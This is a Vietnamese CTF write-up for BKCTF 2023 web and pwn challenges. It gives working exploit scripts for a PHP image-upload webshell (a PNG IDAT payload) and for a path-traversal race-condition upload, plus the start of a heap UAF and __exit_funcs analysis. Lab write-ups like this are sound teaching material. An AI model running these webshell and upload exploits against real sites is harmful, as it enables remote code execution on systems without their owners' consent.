---
title: "BKCTF2023 - webx2, pwnx2, revx2"
excerpt: "üìÖ BKCTF 2023 is an exchange CTF competition, organized by the School of Information and Communication Technology - HCMUT in collaboration with the BKSec ATTT Club and Cookie Arena, aiming to create a useful playground for students who share the same passion. Passionate about Information Security!"
header:
show_date: true
header:
  teaser: "https://hackmd.io/_uploads/Hy9ap7os6.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/Hy9ap7os6.png">
</p>

# Web

`TaiPhung`

![](https://media.giphy.com/media/ISOckXUybVfQ4/giphy.gif)


## Image Copy Resampled
### Description

![](https://hackmd.io/_uploads/SJfb8i-Tn.png)

Link: `http://13.212.34.169:30136`

Source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/bkctf%202023/bkctf2023-imagecopyresampled.zip).

### Solution

Trang ch·ªß:

![](https://hackmd.io/_uploads/HJ71FhWph.png)


Trong `index.php`:
```php
<?php

if(isset($_FILES['image'])){
    
    
    $upload_dir = "./uploads/";
    $file_name = $_FILES['image']['name'];
    $file_tmp = $_FILES['image']['tmp_name'];
    $file_type = $_FILES['image']['type'];
    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
    $size_check = getimagesize($file_tmp);

    $allowed_ext = array('jpg', 'png', 'php');

    
    if(in_array($file_ext, $allowed_ext)){

        $image = imagecreatefromstring(file_get_contents($file_tmp));
        $cropped_image = imagecreatetruecolor(40, 40);
        imagecopyresampled($cropped_image, $image, 0, 0, 0, 0, 40, 40, imagesx($image), imagesy($image));
        $random_name = md5(uniqid(rand(), true));
        $new_file_name = $random_name . '.' . $file_ext;
        
        if ($file_ext === 'jpg' || $file_ext === 'png'  ) {
            //check size
            if ($size_check[0] < 40 || $size_check[1] < 40) { 
                echo "·∫¢nh c·ªßa b·∫°n h∆°i nh·ªè. Ch√∫ng t√¥i c·∫ßn ·∫£nh l·ªõn h∆°n 40x40 pixels\n<br>";
            } else {
                if($file_ext === 'jpg'){
                    imagejpeg($cropped_image, $upload_dir . $new_file_name);
                } else {
                    imagepng($cropped_image, $upload_dir . $new_file_name);
                }
                echo "·∫£nh ƒë√£ ƒë∆∞·ª£c l∆∞u t·∫°i ƒë√¢y\n<br>";
                echo $upload_dir;
                echo $new_file_name;  

                imagedestroy($image);
                imagedestroy($cropped_image);
            }
        } else {
            imagepng($cropped_image, $upload_dir . $new_file_name);
            echo "·∫£nh ƒë√£ ƒë∆∞·ª£c l∆∞u t·∫°i ƒë√¢y\n<br>";
            echo $upload_dir;
            echo $new_file_name;  

            imagedestroy($image);
            imagedestroy($cropped_image);
        }
    } else {        
        echo "Ch·ªâ cho ph√©p t·∫£i l√™n t·ªáp JPG ho·∫∑c PNG v√† pHp ;D ? ? ?";
    }
}
?>
```

C√≥ m·ªôt s·ªë ƒëi·ªÉm ch√∫ √Ω: 
- S·ª≠ d·ª•ng h√†m `isset()` ƒë·ªÉ ki·ªÉm tra xem bi·∫øn `$_FILES['image']` c√≥ t·ªìn t·∫°i hay kh√¥ng. Bi·∫øn n√†y s·∫Ω ch·ª©a th√¥ng tin v·ªÅ t·ªáp h√¨nh ·∫£nh ƒë∆∞·ª£c t·∫£i l√™n.
- `$upload_dir`: ƒê∆∞·ªùng d·∫´n th∆∞ m·ª•c n∆°i h√¨nh ·∫£nh s·∫Ω ƒë∆∞·ª£c l∆∞u tr·ªØ.
- `$file_name`: T√™n c·ªßa t·ªáp h√¨nh ·∫£nh ban ƒë·∫ßu.
- `$file_tmp`: ƒê∆∞·ªùng d·∫´n t·∫°m th·ªùi c·ªßa t·ªáp h√¨nh ·∫£nh tr√™n m√°y ch·ªß.
- `$file_type`: Lo·∫°i t·ªáp (MIME type) c·ªßa h√¨nh ·∫£nh.
- `$file_ext`: Ph·∫ßn m·ªü r·ªông c·ªßa t√™n t·ªáp h√¨nh ·∫£nh (ƒë∆∞·ª£c chuy·ªÉn th√†nh ch·ªØ th∆∞·ªùng).

=> ·ª©ng d·ª•ng web cho ph√©p t·∫£i l√™n m·ªôt t·ªáp h√¨nh ·∫£nh t·ª´ ng∆∞·ªùi d√πng, ƒë·ªìng th·ªùi th·ª±c hi·ªán thu nh·ªè h√¨nh ·∫£nh th√†nh 40x40 pixel n·∫øu l√† ·∫£nh JPEG ho·∫∑c PND.

- Gi·∫£i th√≠ch c∆° ch·∫ø thu nh·ªè ·∫£nh:
H√†m `imagecopyresampled()` t·∫°o ra m·ªôt b·∫£n sao thu nh·ªè c·ªßa h√¨nh ·∫£nh ban ƒë·∫ßu, c√≥ k√≠ch th∆∞·ªõc 40x40 pixel. ƒê√¢y l√† c√°ch l√†m th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o ra c√°c phi√™n b·∫£n h√¨nh ·∫£nh nh·ªè h∆°n ƒë·ªÉ hi·ªÉn th·ªã tr√™n trang web ho·∫∑c ·ª©ng d·ª•ng m√† kh√¥ng l√†m m·∫•t ch·∫•t l∆∞·ª£ng qu√° nhi·ªÅu.

D∆∞·ªõi ƒë√¢y l√† ph·∫ßn m√£ li√™n quan ƒë·∫øn c∆° ch·∫ø n√©n ·∫£nh:
```php
$cropped_image = imagecreatetruecolor(40, 40);
imagecopyresampled($cropped_image, $image, 0, 0, 0, 0, 40, 40, imagesx($image), imagesy($image));

```

- √ù t∆∞·ªüng:
    - upload ·∫£nh ch·ª©a payload
    - payload c·∫ßn ph√π h·ª£p ƒë·ªÉ khi b·ªã n√©n c≈©ng kh√¥ng b·ªã m·∫•t ƒëi d·ªØ li·ªáu
 
M√¨nh t√¨m ki·∫øm theo t·ª´ kh√≥a `PHP-GD` th√¨ th·∫•y m·ªôt s·ªë k·ªπ thu·∫≠t hay:

Tham kh·∫£o ·ªü ƒë√¢y: `https://book.hacktricks.xyz/pentesting-web/file-upload`

![](https://hackmd.io/_uploads/S1S0OiWah.png)


Xem c√°c khai th√°c ƒë∆∞·ª£c cung c·∫•p ta s·ª≠ d·ª•ng c√°c script n√†y:

![](https://hackmd.io/_uploads/H1p-FjWpn.png)

M√¨nh d√πng script `payloads/generators/gen_idat_png.php`

```php
<?php
 
header('Content-Type: image/png');
 
$p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0>
 
$img = imagecreatetruecolor(55, 55);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3)*2, 0, $color);
imagesetpixel($img, round($y / 3)*2+1, 0, $color);
imagesetpixel($img, round($y / 3)*2, 1, $color);
imagesetpixel($img, round($y / 3)*2+1, 1, $color);
}
 
imagepng($img);
?>

```

Script n√†y s·∫Ω t·∫°o ra m·ªôt h√¨nh ·∫£nh 110x110 pixel sau ƒë√≥ n√©n th√†nh 55x55 pixel v·ªõi payload ƒë∆∞·ª£c s·ª≠ d·ª•ng l√† `<?=$_GET[0]($_POST[1]);?>`

M√¨nh s·∫Ω ƒë·ªïi th√†nh 80x80 pixel ƒë·ªÉ khi n√©n s·∫Ω th√†nh 40x40 pixel ph√π h·ª£p v·ªõi ƒëi·ªÅu ki·ªán.

```php
<?php
 
header('Content-Type: image/png');
 
$p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0>
 
$img = imagecreatetruecolor(80, 80);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3)*2, 0, $color);
imagesetpixel($img, round($y / 3)*2+1, 0, $color);
imagesetpixel($img, round($y / 3)*2, 1, $color);
imagesetpixel($img, round($y / 3)*2+1, 1, $color);
}
 
imagepng($img);
?>

```

Run script: 
```bash
‚îå‚îÄ‚îÄ(taiwhis„âøkali)-[~/bkctf/bkctf2023-imagecopyresampled/exploit]
‚îî‚îÄ$ php gen_idat_png.php > text.php
```

Upload file `test.php` l·∫•y ƒë∆∞·ªùng d·∫´n file 

![](https://hackmd.io/_uploads/H1gk5h-T2.png)


G·ªçi shell:
```bash
curl -XPOST -d '1=ls /''http://localhost:1337/uploads/00f3e6fd392783b349714e3f860fde3b.php?0=shell_exec'
```

![](https://hackmd.io/_uploads/B1pE7bzan.png)


V√† m√¨nh nh·∫≠n ƒë∆∞·ª£c flag.

T·∫°i th·ªùi ƒëi·ªÉm m√¨nh vi·∫øt wu th√¨ server kh√¥ng ho·∫°t ƒë·ªông n·ªØa n√™n kh√¥ng c√≥ flag nh√© :hamburger: 

### Script
```python
import sys
import requests
from bs4 import BeautifulSoup
import subprocess

def main(url, file_upload, command_post):
    headers = {
        "Host": url.split("//")[1].split(":")[0],
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36",
        "Referer": url,
        "Cookie": "user=BKSEC_guest",
    }

    files = {
        "image": ("admin.php", open(file_upload, "rb"), "application/octet-stream")
    }

    res = requests.post(url, headers=headers, files=files)

    soup = BeautifulSoup(res.text, 'html.parser')
    br_tag = soup.find('br')
    image_path = br_tag.next_sibling.strip()

    curl_path = "curl"
    path = image_path[1:] + "?0=shell_exec"

    curl_command = [curl_path, "-XPOST", "-d", command_post, f"{url}{path}"]

    try:
        result = subprocess.run(curl_command, capture_output=True, text=True, encoding="ISO-8859-1", check=True)
        output = result.stdout
        print("Flag:")
        print(output)
    except subprocess.CalledProcessError as e:
        print("L·ªói:", e)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <url> <file_upload> <command_post>")
    else:
        url = sys.argv[1]
        file_upload = sys.argv[2]
        command_post = sys.argv[3]
        main(url, file_upload, command_post)

```

Result:
``` bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/bkctf/bkctf2023-imagecopyresampled/exploit/test]
‚îî‚îÄ# python 4.py "http://18.141.143.171:32290/" "test.php" "1=cat /flagdSXlS.txt"
Flag:
PNG
‚ñí

IHDR(/: pHYs√Ñ√Ñ+IDATXc\BKSEC{Php_Gd_iDa7_cHunk_65150cb4cdc2a10d714ed00941de058c}X  √∞
                                                                                   √è√ó-oLa√æ¬™7√ùC?√†√Å¬¶F+mb6J√¶√•l√§~xM\¬¶_Z√Åf¬µ8√º√õ~_√ì}¬™'√∑√±√£√â¬ø_√Ø|¬≤00c√ô√â√Ép√∞√∑√µ√à√¨H'w4X√ú√Ω¬πe√Ç¬∫√É?√ôF√Å(‚ñí¬£`Q0
F√Å(‚ñí¬£`Q0
F√Å(¬†Z)4w√¢,IEND¬ÆB`

```

Flag: `BKSEC{Php_Gd_iDa7_cHunk_65150cb4cdc2a10d714ed00941de058c}`


## Metadata checker
### Description

![](https://hackmd.io/_uploads/HyF12jWa2.png)

Link: `http://18.141.143.171:30037`

Source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/bkctf%202023/bkctf2023-metadata-checker.zip).

### Solution

Upload ·∫£nh b·∫•t k·ª≥ th√¨ th·∫•y nh∆∞ n√†y:

![](https://hackmd.io/_uploads/HJvcibzpn.png)

T√™n ·∫£nh ƒë∆∞·ª£c thay ƒë·ªïi th√†nh b·∫±ng c√°ch g·ªôp: `cookie + timestamp + t√™n ·∫£nh ban ƒë·∫ßu.`

B√†i n√†y y chang m·ªôt b√†i m√¨nh t·ª´ng ƒë·ªçc ·ªü blog c·ªßa vnpt.

- ƒê√¢y l√† m·ªôt b√†i upload file via race condition, tham kh·∫£o chi ti·∫øt t·∫°i blog n√†y: `https://sec.vnpt.vn/2023/05/exploiting-file-upload-vulnerability-with-race-conditions-challenge-for-you`

Source code ch·ªâ c√≥ 1 file index.php l√† ƒë√°ng ch√∫ √Ω.

```php
<?php
error_reporting(0);

setcookie("user", "BKSEC_guest", time() + (86400 * 30), "/"); // Cookie will be valid for 30 days

if (isset($_FILES) && !empty($_FILES)) {
    $uploadpath = "/var/tmp/";
    $error = "";
    
    $timestamp = time();

    $userValue = $_COOKIE['user'];
    $target_file = $uploadpath . $userValue . "_" . $timestamp . "_" . $_FILES["image"]["name"];

    move_uploaded_file($_FILES["image"]["tmp_name"], $target_file);

    if ($_FILES["image"]["size"] > 1048576) {
        $error .= '<p class="h5 text-danger">Maximum file size is 1MB.</p>';
    } elseif ($_FILES["image"]["type"] !== "image/jpeg") {
        $error .= '<p class="h5 text-danger">Only JPG files are allowed.</p>';
    } else {
      $exif = exif_read_data($target_file, 0, true);

      if ($exif === false) {
          $error .= '<p class="h5 text-danger">No metadata found.</p>';
      } else {
          $metadata = '<table class="table table-striped">';
          foreach ($exif as $key => $section) {
              $metadata .=
                  '<thead><tr><th colspan="2" class="text-center">' .
                  $key .
                  "</th></tr></thead><tbody>";
              foreach ($section as $name => $value) {
                  $metadata .=
                      "<tr><td>" . $name . "</td><td>" . $value . "</td></tr>";
              }
              $metadata .= "</tbody>";
          }
          $metadata .= "</table>";
      }
    }
}
?>
<!DOCTYPE html>
<!-- Modified from https://getbootstrap.com/docs/5.3/examples/checkout -->
<html lang="en" data-bs-theme="auto">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>BKSEC Metadata checker</title>
  <link href="assets/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/dist/css/checkout.css" rel="stylesheet">
  <link rel="icon" href="assets/images/logo.png" type="image/png">
</head>

<body class="bg-body-tertiary">

  <div class="container">
    <main>
      <div class="py-5 text-center">
        <a href="/"><img class="d-block mx-auto mb-4"  src="assets/images/logo.png" alt="" width="72"></a>
        <h2>BKSEC Metadata checker</h2>
        <p class="lead">Only jpg files are supported and maximum file size is 1MB.</p>
      </div>
      <form action="/index.php" method="post" enctype="multipart/form-data">
        <label class="h5 form-label">Upload your image</label>
        <input class="form-control form-control-lg my-4" name="image" id="formFileLg" type="file" required/>
        <div class="col text-center">
            <button class="btn btn-primary btn-lg" type="submit">Upload</button>
        </div>
      </form>
	    <?php
        // I want to show a loading effect within 1.5s here but don't know how
        sleep(1.5);
        // This might be okay..... I think so
        // My teammates will help me fix it later, I hope they don't forget that
        echo $error;
        echo $metadata;
        unlink($target_file);
        ?>
    </main>

    <footer class="my-5 pt-5 text-body-secondary text-center text-small">
      <p class="mb-1">&copy; 2023 CLB An To√†n Th√¥ng Tin - BKHN</p>
    </footer>
  </div>
  <script src="assets/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Ch·ªó n√†y c√≥  `Path travesal`.

![](https://hackmd.io/_uploads/SyQHk3Wp3.png)

![](https://hackmd.io/_uploads/rJbuJ2bT2.png)

ƒê·ªÉ √Ω t·ªõi ph·∫ßn `$target_file`: 
`$target_file = $uploadpath . $userValue . "_" . $timestamp . "_" . $_FILES["image"]["name"];`

Ph·∫ßn `$uploadpath = "/var/tmp/";` , `$timestamp = time();`
Ph·∫ßn cookie `$userValue = $_COOKIE['user'];` c√≥ th·ªÉ ch·ªânh s·ª≠a ƒë·ªÉ path travesal upload ra m·ªôt th∆∞ m·ª•c kh√°c

√ù t∆∞·ªüng:
- T·∫°o m·ªôt h√¨nh ·∫£nh ch·ª©a payload `<?php system($_GET['cmd']);?>`
- S·ª≠a Cookie ƒë·ªÉ path reavesal upload qua m·ªôt th∆∞ m·ª•c kh√°c v·ªõi extension l√† `.php`
 `BKSEC_guest` => `../../var/www/html/assets/images/`
 
- G·ªçi t·ªõi h√¨nh ·∫£nh v√† th·ª±c thi l·ªánh

M√¨nh b·∫≠t burp intruder ƒë·ªÉ upload li√™n t·ª•c v√† g·ªçi m·ªôt intruder kh√°c ƒë·ªÉ g·ªçi t·ªõi file ·∫£nh sau upload v·ªõi timestamp tƒÉng d·∫ßn.

M·∫•t kho·∫£ng 30 ph√∫t th√¨ m√¨nh c√≥ flag

### Script
Web cookie han hoan `dead` qu√°, l√∫c m√¨nh vi·∫øt writeup m√¨nh ch∆∞a l·∫•y dc flag m·ªõi.

![](https://hackmd.io/_uploads/B1LMfmMah.png)

script tr√™n local nh∆∞ sau:
```python
import sys
import requests
from datetime import datetime

if len(sys.argv) != 5:
    print("Usage: python script.py url file_name cookie_value cmd")
    sys.exit(1)

url = sys.argv[1]
file_name = sys.argv[2]
cookie_value = sys.argv[3]
cmd = sys.argv[4]

file = {'image': (file_name, open(file_name, 'rb'), 'image/jpeg')}

cookie = {"user": cookie_value}

res = requests.post(url + 'index.php', files=file, cookies=cookie)

date_string = res.headers.get('Date')
print(date_string)

timestamp = int(datetime.strptime(date_string, '%a, %d %b %Y %H:%M:%S %Z').timestamp()) - XXXXX # ph·∫£i thay ƒë·ªïi ·ªü ch·ªó n√†y.

print("Date string:", date_string)
print("Timestamp:", timestamp)

urls = url + f'assets/images/_{timestamp}_{file_name}?cmd={cmd}'

print('url:', urls)

res = requests.get(urls)
print('Result:', res.text)
```

Result:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/downloadable/metadata-checker/docker-php-helloworld/src]
‚îî‚îÄ# python '9.py' 'http://localhost:1337/' 'payload.php' '../www/html/assets/images/' 'id'
Tue, 22 Aug 2023 11:54:15 GMT
Date string: Tue, 22 Aug 2023 11:54:15 GMT
Timestamp: 1692705255
url: http://localhost:1337/assets/images/_1692705255_payload.php?cmd=id
Result: abcbcbuid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# PWN
Author: `Ho√†ng Vi·ªát`

## CLASS MANAGER

![](https://hackmd.io/_uploads/HJKB3Jkph.png)

Ch·∫°y ch∆∞∆°ng tr√¨nh ho·∫∑c nh√¨n t√™n ch∆∞∆°ng tr√¨nh th√¨ ƒë√¢y l√† 1 b√†i heap

### Decompile program

H√†m `main`

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 choice[2]; // [rsp+0h] [rbp-10h] BYREF

  choice[1] = __readfsqword(0x28u);
  puts("Four options to manage students in a class:");
  puts("1. Add a student to the class.");
  puts("2. Show name of a student.");
  puts("3. Delete a student.");
  puts("4. Exit.");
  fflush(_bss_start);
  while ( 1 )
  {
    printf("Enter your choice: ");
    fflush(_bss_start);
    __isoc99_scanf("%lld", choice);
    switch ( choice[0] )
    {
      case 1LL:
        AddStudent();
        break;
      case 2LL:
        ShowStudent();
        break;
      case 3LL:
        DeleteStudent();
        break;
      case 4LL:
        exit(0);
      case 5LL:
        if ( key )
          key("%lld", 0LL);
        break;
      default:
        puts("Invalid choice.");
        break;
    }
  }
}
```

* N√≥ ch·ªâ in ra menu r·ªìi y√™u c·∫ßu ng∆∞·ªùi d√πng nh·∫≠p l·ª±a ch·ªçn

H√†m `Add`

```cpp
unsigned __int64 AddStudent()
{
  __int64 i; // [rsp+0h] [rbp-20h] BYREF
  size_t size; // [rsp+8h] [rbp-18h] BYREF
  void *name; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  i = -1LL;
  printf("Where to put that student in the database: ");
  __isoc99_scanf("%lld", &i);
  if ( CheckID(i) )
  {
    printf("Length of that student's name: ");
    __isoc99_scanf("%lld", &size);
    if ( (__int64)size <= 4095 && (__int64)size > 0 )
    {
      if ( sz[i] != ++size || !*((_QWORD *)&::name + i) )
      {
        name = malloc(size);
        if ( !name )
        {
          puts("Can not create!");
          return v4 - __readfsqword(0x28u);
        }
        *((_QWORD *)&::name + i) = name;
        sz[i] = size;
      }
      printf("Enter the name: ");
      fflush(_bss_start);
      read(0, *((void **)&::name + i), size - 1);
    }
  }
  return v4 - __readfsqword(0x28u);
}
```

* ƒê·∫ßu ti√™n n√≥ y√™u c·∫ßu ng∆∞·ªùi d√πng nh·∫≠p index ƒë·ªÉ l∆∞u v√†o 1 m·∫£ng ch·ª©a c√°c con tr·ªè tr·ªè ƒë·∫øn t√™n h·ªçc sinh
* Index n√†y s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o h√†m `CheckID` ƒë·ªÉ ki·ªÉm tra


```cpp
_BOOL8 __fastcall CheckID(unsigned __int64 a1)
{
  return a1 <= 0x13;
}
```

* Nh∆∞ v·∫≠y index t·ªëi ƒëa s·∫Ω l√† `19`
* Ti·∫øp ƒë·∫øn l√† y√™u c·∫ßu ng∆∞·ªùi d√πng nh·∫≠p size v√† c√°i size n√†y s·∫Ω ƒë∆∞·ª£c l∆∞u tr√™n m·∫£ng `size` t∆∞∆°ng ·ª©ng v·ªõi c√°i index. N√≥ ki·ªÉu tra c√°i size m√† ng∆∞·ªùi d√πng nh·∫≠p c√≥ tr√πng v·ªõi `size[i]` kh√¥ng n·∫øu c√≥ th√¨ ghi ƒë√® l√™n ƒë·ªãa tr·ªâ c≈© l∆∞u t·∫°i `name[i]` kh√¥ng th√¨ s·∫Ω `malloc` 1 con tr·ªè m·ªõi ƒë·ªÉ ghi
* Cu·ªëi c√πng ch·ªâ l√† nh·∫≠p t√™n

H√†m `Show`

```cpp
unsigned __int64 ShowStudent()
{
  unsigned __int64 i; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  i = -1LL;
  printf("Input student ID: ");
  __isoc99_scanf("%lld", &i);
  if ( CheckID(i) && *((_QWORD *)&name + i) )
    printf("%s", *((const char **)&name + i));
  return v2 - __readfsqword(0x28u);
}
```

* N√≥ y√™u c·∫ßu nh·∫≠p index r·ªìi ƒë∆∞a qua h√†m `CheckID` n·∫øu ok th√¨ in ra `name[i]`

H√†m `Delete`

```cpp
unsigned __int64 DeleteStudent()
{
  unsigned __int64 i; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  i = -1LL;
  printf("Input student ID: ");
  __isoc99_scanf("%lld", &i);
  if ( CheckID(i) && *((_QWORD *)&name + i) )
    free(*((void **)&name + i));
  return v2 - __readfsqword(0x28u);
}
```

* N√≥ y√™u c·∫ßu index r·ªìi ki·ªÉm tra qua h√†m `CheckID` v√† `name[i] != NULL` r·ªìi `free(name[i])`
* H√†m n√†y kh√¥ng clear `name[i]` sau khi `free` n√™n ·ªü ƒë√¢y l√† l·ªói `UAF`

### Abuse __exit_funcs

* ·ªû ƒë√¢y ch∆∞∆°ng tr√¨nh d√πng libc 2.35, kh√¥ng s·ª≠ d·ª•ng `__malloc_hook` hay `__free_hook` n·ªØa th√¨ ·ªü ƒë√¢y m√¨nh s·∫Ω fake c√°i `__exit_funcs` ƒë∆∞·ª£c d√πng khi g·ªçi `exit`

```cpp
void exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```

* Khi g·ªçi `exit` th√¨ n√≥ s·∫Ω g·ªçi ƒë·∫øn `__run_exit_handlers` v·ªõi tham s·ªë th·ª© 2 ·ªü ƒë√¢y l√† `__exit_funcs`

```cpp
void attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur = *listp;

      if (cur == NULL)
	{
	  /* Exit processing complete.  We will not allow any more
	     atexit/on_exit registrations.  */
	  __exit_funcs_done = true;
	  break;
	}

      while (cur->idx > 0)
	{
	  struct exit_function *const f = &cur->fns[--cur->idx];
	  const uint64_t new_exitfn_called = __new_exitfn_called;

	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);
	      void *arg;

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
	      arg = f->func.on.arg;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (onfct);
#endif
	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      onfct (status, arg);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_at:
	      atfct = f->func.at;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (atfct);
#endif
	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      atfct ();
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    }

	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	    /* The last exit function, or another thread, has registered
	       more exit functions.  Start the loop over.  */
            continue;
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);
    }

```

* ·ªû ƒë√¢y ch√∫ng ta kh√¥ng quan t√¢m ƒë·∫øn c√°i `__call_tls_dtors`
* Bi·∫øn `cur` ·ªü ƒë√¢y ƒë∆∞·ª£c set l√† `__exit_funcs` m√† ch√∫ng ta pass cho h√†m n√†y v·ªõi type l√† `exit_function_list`

```cpp
enum
{
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
	void (*at) (void);
	struct
	  {
	    void (*fn) (int status, void *arg);
	    void *arg;
	  } on;
	struct
	  {
	    void (*fn) (void *arg, int status);
	    void *arg;
	    void *dso_handle;
	  } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```

* N√≥ l√† 1 c√°i linked list, `idx` ·ªü ƒë√¢y ƒë∆∞·ª£c d√πng nh∆∞ 1 bi·∫øn ƒë·∫øm v√† l√†m index cho `fns`
* `fns` l√† 1 m·∫£ng g√¥m c√°c `exit_function` struct. `flavor` ·ªü ƒë√¢y nh∆∞ l√† 1 c√°i type c·ªßa function, gi√° tr·ªã c·ªßa n√≥ s·∫Ω l√† ·ªü 1 trong c√°i enum kia, ƒë·∫°i lo·∫°i l√† s·∫Ω l√† ch·ªçn g·ªçi `func` v·ªõi tham s·ªë hay v·ªõi c√°i g√¨ ƒë√≥...
* H√†m `__run_exit_handlers` s·∫Ω duy·ªát qua struct r·ªìi g·ªçi `func` nh∆∞ng tr∆∞·ªõc ƒë√≥ n√≥ g·ªçi `PTR_DEMANGLE` ƒë·ªÉ l·∫•y ƒë∆∞·ª£c con tr·ªè h√†m v√¨ con tr·ªè n√†y tr∆∞·ªõc khi ƒë∆∞a v√†o struct th√¨ s·∫Ω ƒë∆∞·ª£c m√£ h√≥a

```cpp
#  define PTR_MANGLE(var)	asm ("xor %%fs:%c2, %0\n"		      \
				     "rol $2*" LP_SIZE "+1, %0"		      \
				     : "=r" (var)			      \
				     : "0" (var),			      \
				       "i" (offsetof (tcbhead_t,	      \
						      pointer_guard)))
```

![](https://hackmd.io/_uploads/rJiN7gJ63.png)

* `PTR_DEMANGLE` s·∫Ω ƒë∆°n gi·∫£n rotate right pointer `0x11` bit v·ªÅ b√™n ph·∫£i r·ªìi xor v·ªõi `fs:0x30` r·ªìi sau ƒë√≥ ƒë∆∞·ª£c g·ªçi
* ·ªû `FS` l∆∞u tr·ªØ thread block control ·ªü `tcbhead_t` struct

```cpp
typedef struct
{
  void *tcb;		/* Pointer to the TCB.  Not necessarily the
			   thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;		/* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  unsigned long int unused_vgetcpu_cache[2];
  /* Bit 0: X86_FEATURE_1_IBT.
     Bit 1: X86_FEATURE_1_SHSTK.
   */
  unsigned int feature_1;
  int __glibc_unused1;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
  /* The lowest address of shadow stack,  */
  unsigned long long int ssp_base;
  /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));

  void *__padding[8];
} tcbhead_t;
```

